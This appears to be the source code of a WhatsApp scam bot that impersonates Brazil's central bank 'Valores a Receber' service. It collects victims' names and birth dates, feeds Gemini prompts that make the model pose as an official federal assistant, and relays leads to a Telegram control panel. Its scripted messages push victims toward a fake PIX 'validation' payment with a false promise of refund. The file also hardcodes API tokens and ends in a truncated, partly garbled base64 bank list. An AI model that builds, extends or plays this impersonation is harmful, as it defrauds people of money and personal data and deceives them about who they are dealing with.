const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const QRCode = require('qrcode');
const FormData = require('form-data');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

const BT = '```'; // Monospace marker for WhatsApp

// --- OBFUSCATION LAYER ---
const _d = (b) => Buffer.from(b, 'base64').toString('utf-8');

let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://www.consultarvaloresareceber.com.br').replace(/\/$/, "");

if (API_URL.includes("discloud.app")) {
    console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
    API_URL = "https://www.consultarvaloresareceber.com.br";
}

const API_HEADERS = {
    'User-Agent': 'SVR-BOT-NODE-RUNTIME/5.0 (ShardCloud-Environment)',
    'X-SVR-Bot-Token': '8643978397'
};

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "AIzaSyCe0RyNY95UPhE1woWTfsshjrZGtyFKAV8";

function mask(str) {
    if (!str) return "NÃO CONFIGURADO";
    return str.substring(0, 6) + "..." + str.substring(str.length - 4);
}

console.log(`\n🤖 [SVR BOT] SISTEMA OPERACIONAL`);
console.log(`---------------------------------------------`);
console.log(`📡 ENDPOINT: ${API_URL}`);
console.log(`🛡️ SEGURANÇA: ATIVA`);
console.log(`---------------------------------------------\n`);

// --- PROMPTS DE IA ---
// Prompt para mensagens espontâneas iniciais (antes do cadastro)
const PROMPT_INICIAL = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ) e da Lei Complementar nº 105/2001. 
Este canal é de uso exclusivo para liberação de ativos financeiros pendentes de titulares cadastrados no sistema federal.
Um cidadão entrou em contato. Responda de forma extremamente formal, institucional e segura, como um assistente de órgão público federal. 
Informe brevemente que identificou valores a receber cadastrados em nome do titular no sistema e que é necessário validar a identidade para prosseguir com a liberação. Não mencione valores específicos. Seja sóbrio, preciso e formal.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**), pois o WhatsApp não reconhece e polui a mensagem.

Mensagem do cidadão:`;

// Prompt para validação de data inválida
const PROMPT_DATA_INVALIDA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
O cidadão enviou uma mensagem que não corresponde a uma data de nascimento válida. Solicite novamente de forma formal e institucional, no formato DD/MM/AAAA.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).

Mensagem do cidadão:`;

// Prompt para validação de nome inválido
const PROMPT_NOME_INVALIDO = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
O cidadão enviou algo que não parece ser um nome completo válido. Solicite que informe o nome completo conforme consta em documento oficial, de forma formal e institucional.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).

Mensagem do cidadão:`;

// Prompt para mensagens durante a fila de espera
const PROMPT_FILA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ).
O cidadão está aguardando na fila de processamento para liberação de seus ativos financeiros. O registro dele já foi validado com sucesso e está em análise pelos sistemas do Banco Central.
Responda de forma formal, institucional e tranquilizadora, informando que o processo está em andamento e que ele será notificado assim que a liberação for processada. Solicite que aguarde. Não mencione valores. Seja sóbrio e oficial.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**), pois o WhatsApp não reconhece e polui a mensagem.

Mensagem do cidadão durante a espera:`;

async function askAI(prompt, userMessage) {
    if (!GEMINI_KEY) return null;
    try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
        const response = await axios.post(url, {
            contents: [{ parts: [{ text: `${prompt}\n\n"${userMessage}"` }] }]
        });
        return response.data.candidates[0].content.parts[0].text || null;
    } catch (e) {
        console.error('❌ [IA] Erro ao chamar Gemini:', e.message);
        return null;
    }
}

// --- SESSÕES ---
let chatSessions = new Map();
const SESSIONS_FILE = path.join(process.cwd(), 'sessions.json');

// --- LOCK DE PROCESSAMENTO POR LEAD ---
// Evita que duas mensagens simultâneas do mesmo lead causem respostas duplicadas
const processingLock = new Set();

function loadSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf-8'));
            chatSessions = new Map(Object.entries(data));
            console.log(`📂 [SESSÕES] ${chatSessions.size} sessão(ões) restaurada(s).`);
        }
    } catch (e) { console.error('Erro ao carregar sessões:', e.message); }
}

function saveSessions() {
    try {
        const obj = Object.fromEntries(chatSessions);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2));
    } catch (e) { console.error('Erro ao salvar sessões:', e.message); }
}

loadSessions();

// --- FILA DE ESPERA ---
// Guarda leads que já concluíram o cadastro e aguardam liberação manual
let waitingQueue = [];
const QUEUE_FILE = path.join(process.cwd(), 'waiting-queue.json');

function loadQueue() {
    try {
        if (fs.existsSync(QUEUE_FILE)) {
            waitingQueue = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf-8'));
            console.log(`📂 [FILA] ${waitingQueue.length} lead(s) na fila restaurado(s).`);
        }
    } catch (e) { console.error('Erro ao carregar fila:', e.message); }
}

function saveQueue() {
    try {
        fs.writeFileSync(QUEUE_FILE, JSON.stringify(waitingQueue, null, 2));
    } catch (e) { console.error('Erro ao salvar fila:', e.message); }
}

function addToQueue(chatId, name, birthDate) {
    // Evita duplicatas
    if (!waitingQueue.find(q => q.chatId === chatId)) {
        waitingQueue.push({ chatId, name, birthDate, joinedAt: Date.now() });
        saveQueue();
    }
}

function getQueuePosition(chatId) {
    const idx = waitingQueue.findIndex(q => q.chatId === chatId);
    return idx >= 0 ? idx + 1 : null;
}

function removeFromQueue(chatId) {
    waitingQueue = waitingQueue.filter(q => q.chatId !== chatId);
    saveQueue();
}

loadQueue();

// --- TELEGRAM ---
async function notifyTelegram(html, messageId, replyMarkup) {
    if (!TG_TOKEN || !CHAT_ID) return null;
    try {
        if (messageId) {
            const payload = { chat_id: CHAT_ID, message_id: messageId, text: html, parse_mode: 'HTML' };
            if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, payload);
            return res.data.result?.message_id || messageId;
        } else {
            const payload = { chat_id: CHAT_ID, text: html, parse_mode: 'HTML' };
            if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, payload);
            return res.data.result?.message_id || null;
        }
    } catch (e) {
        console.error('❌ [TELEGRAM] Falha ao notificar:', e.message);
        return null;
    }
}

async function notifyTelegramPhoto(buffer, caption) {
    if (!TG_TOKEN || !CHAT_ID) return null;
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'media.png', contentType: 'image/png' });
        form.append('caption', caption, { contentType: 'text/plain' });
        form.append('parse_mode', 'HTML');

        const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            timeout: 20000
        });
        return res.data.result?.message_id || null;
    } catch (e) {
        console.error('❌ [TELEGRAM] Erro ao enviar foto:', e.message);
        return null;
    }
}

// Monta o texto do painel de cadastro no Telegram (editável)
function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', humanStep = 0, isCalling = false) {
    const statusEmoji = {
        'preenchendo_data': '⏳',
        'preenchendo_nome': '⏳',
        'validado': '✅',
        'na_fila': '🕐',
        'human': '👤'
    }[status] || '⏳';

    const tipoLabel = tipo === 'CNPJ' ? '🏢 Pessoa Jurídica (CNPJ)' : '👤 Pessoa Física (CPF)';
    const dataLabel = tipo === 'CNPJ' ? 'Data de Abertura' : 'Data de Nascimento';
    const nomeLabel = tipo === 'CNPJ' ? 'Razão Social' : 'Nome Completo';

    const nomeDisplay = nome ? `✅ <b>${nome}</b>` : `<i>⏳ Preenchendo...</i>`;
    const dataDisplay = dataNasc ? `✅ <b>${dataNasc}</b>` : `<i>⏳ Preenchendo...</i>`;

    let statusMsg = '';
    if (status === 'preenchendo_data') statusMsg = '📝 <i>Aguardando data de nascimento...</i>';
    else if (status === 'preenchendo_nome') statusMsg = '📝 <i>Aguardando nome completo...</i>';
    else if (status === 'validado') statusMsg = '✅ <b>CADASTRO CONCLUÍDO — Enviado para a fila!</b>';
    else if (status === 'na_fila') {
        const pos = getQueuePosition(chatId);
        statusMsg = pos ? `🕐 <b>Na fila — Posição: ${pos}º</b>` : `🕐 <b>Na fila de processamento</b>`;
    } else if (status === 'human') {
        if (isCalling) statusMsg = '📞 <b>EM LIGAÇÃO AGORA... (Falando com Lead)</b>';
        else if (humanStep === 1) statusMsg = '👤 <b>EM ATENDIMENTO (Etapa 2: PENDENTE 📵)</b>';
        else if (humanStep === 2) statusMsg = '👤 <b>EM ATENDIMENTO (Etapa 2: CONCLUÍDA ✅)</b>';
        else statusMsg = '👤 <b>ATENDIMENTO MANUAL ATIVO</b>';
    }

    const text = `${statusEmoji} <b>PAINEL DE CONTROLE DO LEAD</b>\n\n` +
        `👤 <b>Lead:</b> <code>${chatId}</code>\n` +
        `📄 <b>Tipo:</b> ${tipoLabel}\n\n` +
        `📋 <b>Dados do Titular:</b>\n` +
        `• ${dataLabel}: ${dataDisplay}\n` +
        `• ${nomeLabel}: ${nomeDisplay}\n\n` +
        `📊 <b>Status:</b> ${statusMsg}`;

    const e2Label = humanStep >= 2 ? "📞 Etapa 2 ✅" : "📞 Etapa 2 (Pendente)";
    const e3Label = humanStep >= 3 ? "🔐 Etapa 3 ✅" : "🔐 Etapa 3 (Validação)";

    const reply_markup = {
        inline_keyboard: [
            [
                { text: e2Label, callback_data: `etapa:2:${chatId}` },
                { text: e3Label, callback_data: `etapa:3:${chatId}` }
            ],
            [
                { text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix:${chatId}` },
                { text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }
            ]
        ]
    };

    return { text, reply_markup };
}

// --- CLIENTE WHATSAPP ---
const botIdArg = process.argv.find(a => a.startsWith('--id='));
const BOT_ID = botIdArg ? botIdArg.split('=')[1] : 'main';
const STATUS_FILE = `bot-status-${BOT_ID}.json`;

console.log(`🤖 [BOT] Iniciando instância: ${BOT_ID} | Status: ${STATUS_FILE}`);

const client = new Client({
    authStrategy: new LocalAuth({ clientId: BOT_ID, dataPath: '.wwebjs_auth' }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    }
});

client.on('qr', async (qr) => {
    console.log('\n📱 [QR CODE] Escaneie com o WhatsApp:\n');
    qrcode.generate(qr, { small: true });
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'WAITING_QR', qr, ts: Date.now() }));

    try {
        const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
        const qrBuffer = await QRCode.toBuffer(qr, { width: 512, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', qrBuffer, { filename: 'qrcode.png', contentType: 'image/png' });
        form.append('caption', `📲 <b>QR CODE — ${slotLabel}</b>\n\nEscaneie com o WhatsApp para conectar o bot.\n\n⏳ Aguardando leitura...`, { contentType: 'text/plain' });
        form.append('parse_mode', 'HTML');

        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            timeout: 15000
        });
        console.log('✅ [TELEGRAM] QR Code enviado com sucesso!');
    } catch (e) {
        console.error('❌ [TELEGRAM] Erro ao enviar QR Code como imagem:', e.message);
        await notifyTelegram(`📱 <b>QR CODE GERADO</b>\nNão foi possível enviar a imagem. Verifique os logs do servidor.`);
    }
});

client.on('ready', async () => {
    console.log('✅ [BOT] WhatsApp conectado e pronto!');
    let adminName = BOT_ID === 'main' ? 'Perfil 1' : BOT_ID;
    try {
        const info = client.info;
        if (info && info.pushname) adminName = info.pushname;
    } catch (e) { }
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'CONNECTED', adminName, ts: Date.now() }));
    const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
    notifyTelegram(`✅ <b>${slotLabel} CONECTADO</b>\n\n📱 WhatsApp vinculado com sucesso!\nO bot está pronto para atendimento.`);
});

client.on('incoming_call', async (call) => {
    if (BOT_ID !== 'main') return;
    const targetChatId = call.from;
    const currentSession = chatSessions.get(targetChatId);
    
    console.log(`📞 [INCOMING] Chamada de ${targetChatId}`);
    
    if (currentSession) {
        currentSession.isCalling = true;
        chatSessions.set(targetChatId, currentSession);
        
        if (currentSession.tgMsgId) {
            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, currentSession.humanStep || 1, true);
            await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
        }
    }
});

client.on('disconnected', (reason) => {
    console.log('⚠️ [BOT] Desconectado:', reason);
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'DISCONNECTED', reason, ts: Date.now() }));
});

// =============================================================
// HANDLER 1: 'message_create' — SOMENTE para detectar quando o
// admin digita manualmente e assume o atendimento de um lead.
// NÃO processa mensagens recebidas aqui para evitar confusão.
// =============================================================

// Mensagem formal enviada automaticamente quando o operador assume
const MENSAGEM_OPERADOR_ASSUME = `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
*Departamento de Liberação de Ativos Financeiros*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal SVR, vinculado ao Banco Central do Brasil, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.

Seu processo de liberação de ativos financeiros pendentes encontra-se devidamente registrado em nosso sistema federal e aguarda a conclusão das etapas obrigatórias de validação, conforme previsto na legislação vigente.

📋 *ETAPAS OBRIGATÓRIAS PARA LIBERAÇÃO:*

*1ª Etapa — Autenticação de Identidade:* ✅ Concluída
Validação dos dados cadastrais do titular perante os registros do Banco Central do Brasil.

*2ª Etapa — Validação Jurídica do Processo:* 🔄 Em andamento
Análise e homologação do pedido de resgate junto ao Departamento de Ativos Não Reclamados.

*3ª Etapa — Confirmação do Canal de Recebimento:* ⏳ Pendente
Verificação e habilitação da conta de destino para transferência dos valores resgatados.

*4ª Etapa — Liberação e Transferência dos Valores:* ⏳ Pendente
Processamento final e crédito dos ativos financeiros na conta indicada pelo titular.

⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no retorno dos valores ao Fundo Garantidor.

Nosso operador responsável conduzirá o(a) senhor(a) pelas próximas etapas de forma segura, sigilosa e dentro dos prazos legalmente estabelecidos.

_Contamos com sua colaboração e compreensão._

*Portal SVR — Banco Central do Brasil*
*CNPJ: 00.038.166/0001-05*
_Este canal é monitorado e possui validade jurídica._`;

// --- MENSAGENS POR ETAPA ---
const MENSAGEM_ETAPA_2_CONCLUIDA =
    `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
*Departamento de Liberação de Ativos Financeiros*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

✅ *A Validação Jurídica do seu processo foi concluída com êxito.*

Nosso operador especializado confirmou a titularidade e a autenticidade dos seus dados perante o Departamento de Ativos Não Reclamados do Banco Central do Brasil.

📋 *STATUS ATUALIZADO DAS ETAPAS:*

✅ 1ª Etapa — Autenticação de Identidade: *CONCLUÍDA*
✅ 2ª Etapa — Validação Jurídica do Processo: *CONCLUÍDA*
⏳ 3ª Etapa — Confirmação do Canal de Recebimento: *PENDENTE*
⏳ 4ª Etapa — Liberação e Transferência dos Valores: *PENDENTE*

Nosso operador dará continuidade ao processo em instantes. Permaneça disponível.

*Portal SVR — Banco Central do Brasil*
_Este processo possui registro jurídico e validade legal._`;

const MENSAGEM_ETAPA_3 =
    `🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*
*Departamento de Segurança Financeira — Portal SVR*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Para garantir a integridade da transferência dos seus ativos, o sistema exige a realização de um procedimento de *Validação de Vínculo Bancário*. 

⚠️ *ESCLARECIMENTO:* Este procedimento *NÃO* é uma transação comercial, mas sim uma autenticação obrigatória da conta bancária que irá receber os valores. O protocolo gera um *Vínculo de Segurança* entre o Banco Central e sua conta.

📋 *DADOS DO PROTOCOLO DE VALIDAÇÃO:*

🔹 *Protocolo:* #VAL-SVR-CONFIRM
🔹 *Validade:* 15 Minutos (Expirável)
🔹 *Finalidade:* Habilitação de canal para recebimento de ativos.

✅ *REEMBOLSO IMEDIATO:* Assim que a validação for processada pelo sistema, o valor utilizado para autenticação será *ESTORNADO INSTANTANEAMENTE* para sua conta, somado ao valor total dos seus ativos recuperados.

O sistema processará o estorno de forma automática via PIX em até 60 segundos após a confirmação do protocolo.

Aguarde o envio das instruções de validação (Código Hash de Autenticação).

*Portal SVR — Banco Central do Brasil*
_Processo regido pela Resolução BCB nº 318/2023._`;

const MENSAGEM_ETAPA_4 =
    `🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*
*Departamento de Rastreamento de Ativos — SVR*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Informamos que o seu *Protocolo Privado de Segurança* foi gerado com êxito pelo sistema federal de ativos.

🖥️ *STATUS DO SISTEMA:*
${BT}
ID: #SVR-PROT-OK
STATUS: PRONTO_PARA_USO
TYPE: CHAVE_HASH_CRIPTOGRAFADA
VINCULO: ATIVO
${BT}

✅ O código enviado anteriormente representa o seu link de autenticação segura. Assim que a integração for detectada pela rede bancária, o processo avançará automaticamente para a fase de crédito final.

⚠️ *ATENÇÃO:* Permaneça nesta tela. O sistema está monitorando a validação do hash em tempo real. Assim que concluído, o montante total será liberado.

*Portal SVR — Banco Central do Brasil*`;

const MENSAGEM_ETAPA_5 =
    `✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
*Departamento de Execução Financeira — Portal SVR*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ *PARABÉNS! SEU RESGATE FOI PROCESSADO COM SUCESSO.*

Prezado(a) Titular,

É com satisfação que informamos a conclusão do seu processo de recuperação de ativos financeiros. Todas as etapas de validação jurídica, vínculo bancário e homologação federal foram devidamente superadas.

💰 *STATUS DA TRANSFERÊNCIA:*
${BT}
VALOR TOTAL: LIBERADO
ESTORNO TAXA: PROCESSADO
PRAZO: ATÉ 1 DIA ÚTIL
${BT}

O montante total (Ativos + Reembolso do Protocolo) será creditado na conta informada em até *24 horas úteis*, conforme o fluxo de liquidação do Banco Central do Brasil.

O senhor(a) receberá uma notificação via SMS ou e-mail assim que o valor estiver disponível para uso.

*Agradecemos a sua confiança e colaboração.*
━━━━━━━━━━━━━━━━━━━━━━━━━━━
*Portal SVR — Banco Central do Brasil*
_Processo 100% Homologado e Finalizado._`;

const BANCOS_LIST = JSON.parse(_d("eyIxMDAiOiJQbGFubmVyIENvcnJldG9yYSBkZSBWYWxvcmVzIFMuQS4iLCIxMDEiOiJSZW5hc2NlbmNhIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTAyIjoiWHAgSW52ZXN0aW1lbnRvcyBDb3JyZXRvcmEgZGUgQ8OibWJpbyxUw610dWxvcyBkIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMvQSIsIjEwNCI6IkNhaXhhIEVjb25vbWljYSBGZWRlcmFsIiwiMTA1IjoiTGVjY2EgQ3LDqWRpdG8iLCIxMDciOiJCYW5jbyBCb2NvbSBCYm0gUy5BLiIsIjEwOCI6IlBvcnRvY3JlZCBTLkEuIC0gQ3JlZGl0byIsIjExMSI6Ik9saXZlaXJhIFRydXN0IERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsaWFyaW9zIFMuQS4iLCIxMTMiOiJNYWdsaWFubyBTLkEuIENvcnJldG9yYSBEZSBDYW1iaW8gRSBWYWxvcmVzIE1vYmlsaWFyaW9zIiwiMTE0IjoiQ2VudHJhbCBDb29wZXJhdGl2YSBEZSBDcsOpZGl0byBObyBFc3RhZG8gRG8gRXNww61yaXRvIFNhbnRvIC0gQ2Vjb29wIiwiMTE3IjoiQWR2YW5jZWQgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYSIsIjExOSI6IkJhbmNvIFdlc3Rlcm4gVW5pb24gRG8gQnJhc2lsIFMuQS4iLCIxMjAiOiJCYW5jbyBSb2RvYmVucyBTLkEuIiwiMTIxIjoiQmFuY28gQWdpYmFuayBTLkEuIiwiMTIyIjoiQmFuY28gQnJhZGVzY28gQmVyaiBTLkEuIiwiMTI0IjoiQmFuY28gV29vcmkgQmFuayBEbyBCcmFzaWwgUy5BLiIsIjEyNSI6IlBsdXJhbCBTLkEuIEJhbmNvIE3Dumx0aXBsbyIsIjEyNiI6IkJyIFBhcnRuZXJzIEJhbmNvIERlIEludmVzdGltZW50byBTLkEuIiwiMTI3IjoiQ29kZXBlIENvcnJldG9yYSBEZSBWYWxvcmVzIEUgQ8OibWJpbyBTLkEuIiwiMTI4IjoiTXMsIEJhbmvInNfQmVyaiIsIjEyOSI6IlVicyBCcmFzaWwgQmFuY28gZGUgSW52ZXN0aW1lbnRvIFMuQS4iLCIxMzAiOiJDYXJ1YW5hIFMuQS4gLSBTb2NpZWRhZGUgRGUgQ3LDqWRpdG8iLCIxMzEiOiJUdWxsZXR0IFByZWJvbiBCcmFzaWwgIENvcnJldG9yYSBkZSBWYWxvcmVzIGUgQ8OibWJpbyBMdGRhIiwiMTMyIjoiSWNiYyBEbyBCcmFzaWwgQmFuY28gTcO6bHRpcGxvIFMuQS4iLCIxMzMiOiJCYW5jbyBDcmVzb2wgLSBDb25mZWRlcmHDp8OjbyBOYWNpb25hbCBEYXMgQ29vcGVyYXRpdmFzIENlbnRyYWlzIERlIENyw6lkaXRvIGUgRWNvbm9taWEgRmFtaWxpYXIgZSBTb2xpZMOhcmlhIiwiMTM0IjoiQmdjIExpcXVpZGV6IERpc3RyaWJ1aWRvcmEgRGUgVMOtdHVsb3MgRSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTM2IjoiVW5pY3JlZCBEbyBCcmFzaWwgLSBDb25mZWRlcmHDp8OjbyBOYWNpb25hbCBEYXMgQ29vcGVyYXRpdmFzIENlbnRyYWlzIFVuaWNyZWQgTHRkYS4iLCIxMzgiOiJHZXQgTW9uZXkgQ29ycmV0b3JhIERlIEPDom1iaW8gUy5BLiIsIjEzOSI6IkludmVzYSBTYW5wYW9sbyBCcmFzaWwgUy5BLiAtIEJhbmNvIE3Dumx0aXBsbyIsIjE0MCI6IkVhc3ludmVzdCAtIFTDrXR1bG8gQ29ycmV0b3JhIERlIFZhbG9yZXMgU2EiLCIxNDIiOiJCcm9rZXIgQnJhc2lsIENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMTQzIjoiVHJldmlzbyBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTQ0IjoiQmV4cyBCYW5jbyBEZSBDw6JtYmlvIFMvQSIsIjE0NSI6IkxldnljYW0gLSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEUgVmFsb3JlcyBMdGRhLiIsIjE0NiI6Ikd1aXR0YSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEx0ZGEuIiwiMTQ5IjoiRmFjdGEgRmluYW5jZWlyYSBTLkEuIC0gQ3LDqWRpdG8gRmluYW5jaWFtZW50byBlIEludmVzdGltZW50byIsIjE1NyI6IkljYXAgRG8gQnJhc2lsIENvcnJldG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXBNb2JpbGnDoXJpb3MgTHRkYS4iLCIxNTkiOiJDYXNhIERvIENyw6lkaXRvIFMuQS4gU29jaWVkYWRlIERlIENyw6lkaXRvIEFvIE1pY3JvZW1wcmVlbmRlZG9yIiwiMTYzIjoiQ29tbWVyemJhbmsgQnJhc2lsIFMuQS4gLSBCYW5jbyBNw7psdGlwbG8iLCIxNjkiOiJCYW5jbyBPbMOpIENvbnNpZ25hZG8gUy5BLiIsIjE3MyI6IkJybCBUcnVzdBEGlzdHJpYnVpZG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIxNzQiOiJQZWZpc2EgUy5BLiAtIENyw6lkaXRvIiwiMTc3IjoiR3VpZGUgSW52ZXN0aW1lbnRvcyBTLkEuIENvcnJldG9yYSBEZSBWYWxvcmVzIiwiMTgwIjoiQ20gQ2FwaXRhbCBNYXJrZXRzIENvcnJldG9yYSBEZSBDw6JtYmlvLCBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9z IEx0ZGEiLCIxODMiOiJTb2NyZWQgUy5BLiAtIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciBlIGEgRW1wcmVzYSBEZSBQZXF1ZW5vIFAiLCIxODQiOiJCYW5jbyBJdGHDuiBCQkEgUy5BLiIsIjE4OCI6IkF0aXZhIEludmVzdGltZW50b3MgUy5BLiBDb3JyZXRvcmEgRGUgVMOtdHVsb3MsIEPDom1iaW8gRSBWYWxvcmVzIiwiMTg5IjoiSFMgRmluYW5jZWlyYSBTL0EgQ3JlZGl0byIsIjE5MCI6IlNlcnZpY29vcCAtIENvb3BlcmF0aXZhIERlIENyw6lkaXRvIERvcyBTZXJ2aWRvcmVzIFDDumJsaWNvcyBFc3RhZHVhaXMgRG8gUmlvIEdyYW4iLCIxOTEiOiJOb3ZhIEZ1dHVyYSBDb3JyZXRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhLiIsIjE5NCI6IlBhcm1ldGFsIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTk2IjoiRmFpciBDb3JyZXRvcmEgRGUgQ2FtYmlvIFMuQS4iLCIxOTciOiJTdG9uZSBQYWdhmZW50b3MgUy5BLiIsIjIwOCI6JCYW5jbyBCVEcgUGFjdHVhbCBTLkEuIiwiMjEyIjoiQmFuY28gT3JpZ2luYWwgUy5BLiIsIjIxMyI6IkJhbmNvIEFyYmkgUy5BLiIsIjIxNyI6IkJhbmNvIEpvaG4gRGVlcmUgUy5BLiIsIjIxOCI6IkJhbmNvIEJzMiBTLkEuIiwiMjIyIjoiQmFuY28gQ3LDqWRpdCBBZ3JpY29sZSBCcmFzaWwgUy5BLiIsIjIyNCI6IkJhbmNvIEZpYnJhIFMuQS4iLCIyMzMiOiJCYW5jbyBDZXRlbGVtIFMuQS4iLCIyMzciOiJCYW5jbyBCcmFkZXNjbyBTLkEuIiwiMjQxIjoiQmFuY28gQ2xhc3NpY28gUy5BLiIsIjI0MyI6IkJhbmNvIE3DoXhpbWEgUy5BLiIsIjI0NiI6IkJhbmNvIEFiYyBCcmFzaWwgUy5BLiIsIjI0OSI6IkJhbmNvIEludmVzdGNyZWQgVW5pYmFuY28gUy5BLiIsIjI1MCI6IkJjdiAtIEJhbmNvIERlIENyw6lkaXRvIEUgVmFyZWpvIFMuQS4iLCIyNTMiOiJCZXhzIENvcnJldG9yYSBEZSBDw6JtYmlvIFMvQSIsIjI1NCI6IlBhcmFuw6EgQmFuY28gUy5BLiIsIjI1OSI6Ik1vbmV5Y29ycCBCYW5jbyBEZSBDw6JtYmlvIFMuQS4iLCIyNjAiOiJOdSBQYWdhbWVudG9zIFMuQS4iLCIyNjUiOiJCYW5jbyBGYXRvciBTLkEuIiwiMjY2IjoiQmFuY28gQ2VkdWxhIFMuQS4iLCIyNjgiOiJCYXJpIENvbXBhbmhpYSBIaXBvdGVjw6FyaWEiLCIyNjkiOiJCYW5jbyBIU0JDIFMuQS4iLCIyNzAiOiJTYWdpdHVyIENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMjcxIjoiSWIgQ29ycmV0b3JhIERlIEPDom1iaW8sIFTDrXR1bG8gRSBWYWxvcmVzIE1vYmlsacOhcmlvcyBTLkEuIiwiMjcyIjoiS2FpayBDb3JyZXRvcmEgRGUgQ2FtYmlvIFMuQS4iLCIyNzMiOiJDb29wZXJhdGl2YSBEZSBDcmVkaXRvIFJ1cmFsIERlIFNfbyBNaWd1ZWwgRG8gT2VzdGUgLSBTdWxjcmVkaS9T_byBNaWd1ZW